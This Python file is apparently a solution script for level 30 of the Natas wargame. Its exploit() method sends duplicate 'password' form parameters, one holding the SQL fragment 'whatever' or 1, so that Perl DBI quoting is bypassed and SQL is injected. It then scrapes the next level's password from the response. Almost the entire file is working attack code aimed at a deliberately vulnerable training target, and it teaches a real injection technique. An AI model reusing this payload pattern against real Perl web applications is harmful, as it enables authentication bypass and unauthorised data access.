import re
from src.natas.base_level import NatasLevel

class Level_30(NatasLevel):

  num = 30
  explanation = "On this level, Perl's DBI mishandles duplicate `password` parameters as an array,\n     allowing us to bypass input sanitization and inject SQL."

  def exploit(self) -> str:

    PAYLOAD = [
            ("username", "natas28"),
            ("password", "'whatever' or 1"),
            ("password", "4"),
        ]

    resp    = self.session.post(self.base_url, data = PAYLOAD)
    match   = re.search(r"natas31([A-Za-z0-9]{32})", resp.text).group(1)

    return match
